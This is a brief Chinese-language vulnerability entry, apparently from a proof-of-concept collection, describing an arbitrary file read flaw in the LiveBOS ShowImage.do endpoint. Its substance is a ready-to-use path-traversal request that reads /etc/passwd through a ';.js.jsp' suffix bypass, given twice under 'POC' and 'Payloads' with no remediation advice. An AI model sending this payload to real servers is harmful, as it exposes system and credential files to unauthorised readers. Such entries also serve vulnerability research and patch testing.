# LiveBOS ShowImage.do 任意文件读取漏洞

## 漏洞描述
LiveBOS ShowImage.do 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登陆页面

![image-20230828111822866](images/image-20230828111822866.png)

验证POC

```
/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
```


## Payloads
```
/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
```
